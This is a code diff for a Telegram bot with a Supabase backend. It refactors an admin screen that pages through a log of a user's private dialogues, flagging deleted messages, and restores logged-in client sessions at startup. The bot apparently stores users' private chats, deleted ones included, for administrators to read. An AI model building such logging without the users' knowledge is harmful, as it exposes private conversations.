-    page = int(parts[4])
+async def refresh_admin_pm_view(admin_id, uid, cid, page):
     limit = 5
     offset = (page - 1) * limit
     
     res = supabase.table("messages_log").select("*").eq("user_id", uid).eq("chat_id", cid).order("date", desc=True).range(offset, offset+limit-1).execute()
     res_count = supabase.table("messages_log").select("id", count="exact").eq("user_id", uid).eq("chat_id", cid).execute()
     
-    msgs = res.data[::-1] # Reverse for chronological view
+    msgs = res.data[::-1] # Хронологический порядок снизу
     text = f"📜 **История диалога:**\n\n"
     for r in msgs:
         dt = datetime.datetime.fromisoformat(r["date"]).strftime("%H:%M")
@@ -1050,18 +1151,34 @@ async def admin_viewpm(cb: types.CallbackQuery):
         content = r["text"]
         if r["is_media"]: content += f" {r['media_type']}"
         if r["is_deleted"]: content += " |УДАЛЕНО|"
-        text += f"{dt} | {name}: {content}\n"
+        text += f"`{dt}` | **{name}**: {content}\n"
         
     builder = InlineKeyboardBuilder()
     pag_btns = build_pagination(f"admin_viewpm_{uid}_{cid}", page, min(res_count.count, 50), limit)
     if pag_btns: builder.row(*pag_btns)
     builder.row(types.InlineKeyboardButton(text="Назад", callback_data=f"admin_upms_{uid}_1"))
     
-    await edit_or_send(cb.from_user.id, text, reply_markup=builder.as_markup(), parse_mode="Markdown")
+    await edit_or_send(admin_id, text, reply_markup=builder.as_markup(), parse_mode="Markdown")
+
+@dp.callback_query(F.data.startswith("admin_viewpm_"))
+async def admin_viewpm(cb: types.CallbackQuery):
+    if not is_admin(cb.from_user.id, cb.from_user.username): return
+    parts = cb.data.split("_")
+    uid = int(parts[2])
+    cid = int(parts[3])
+    page = int(parts[4])
+    
+    u_state = get_user_state(cb.from_user.id)
+    u_state["current_menu"] = "admin_viewpm"
+    u_state["admin_view_user"] = uid
+    u_state["admin_view_chat"] = cid
+    u_state["admin_view_page"] = page
+    
+    await refresh_admin_pm_view(cb.from_user.id, uid, cid, page)
 
 # === ЗАПУСК И ВОССТАНОВЛЕНИЕ ===
 async def render_web_handler(request):
-    return web.Response(text="Сервак та работает гений :0")
+    return web.Response(text="Сервер работает 🚀")
 
 async def start_web_server():
     app = web.Application()
@@ -1076,16 +1193,20 @@ async def start_web_server():
 async def on_startup():
     print("🚀 Бот запущен. Восстановление активных сессий...")
     try:
-        res = supabase.table("user_configs").select("user_id").eq("logged_in", True).execute()
+        res = supabase.table("user_configs").select("*").eq("logged_in", True).execute()
         if res.data:
             for row in res.data:
                 uid = row["user_id"]
+                data = get_user_state(uid)
+                data["is_menu_locked"] = row.get("is_menu_locked", False)
+                data["last_interaction_time"] = row.get("last_interaction_time", time.time())
                 await ensure_client_connected(uid)
     except Exception as e:
         print(f"⚠️ Ошибка при авто-восстановлении: {e}")
         
-    # Запуск web сервера
     asyncio.create_task(start_web_server())
+    asyncio.create_task(background_lock_monitor())
+    asyncio.create_task(admin_status_loop())
 
 if __name__ == "__main__":
     loop = asyncio.get_event_loop()
